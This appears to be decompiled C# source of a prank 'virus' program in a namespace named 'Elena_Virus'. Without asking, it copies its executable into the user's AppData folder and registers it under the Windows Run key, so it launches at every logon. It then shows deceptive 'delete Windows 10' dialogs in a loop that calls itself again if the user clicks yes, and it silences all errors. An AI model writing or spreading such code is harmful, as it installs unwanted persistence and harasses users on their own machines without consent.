using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Elena_Virus;

internal class Program
{
	private static void Main()
	{
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Invalid comparison between Unknown and I4
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		string sourceFileName = AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\delete_me.exe";
		try
		{
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/delete_me.exe"))
			{
				if ((int)MessageBox.Show("Do you want to delete Windows 10?", "Windows 10 Virus", (MessageBoxButtons)4, (MessageBoxIcon)32) == 6)
				{
					MessageBox.Show("Error, you can't delete Windows 10!", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
					Main();
				}
				else
				{
					MessageBox.Show("Okay, then this virus gonna destroy itself. Have a nice day!", "Info", (MessageBoxButtons)0, (MessageBoxIcon)64);
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					registryKey.DeleteValue("Funny file");
				}
			}
			else
			{
				File.Copy(sourceFileName, text);
				RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				Console.WriteLine(text);
				registryKey2.SetValue("Funny file", text);
			}
		}
		catch (Exception)
		{
		}
	}
}
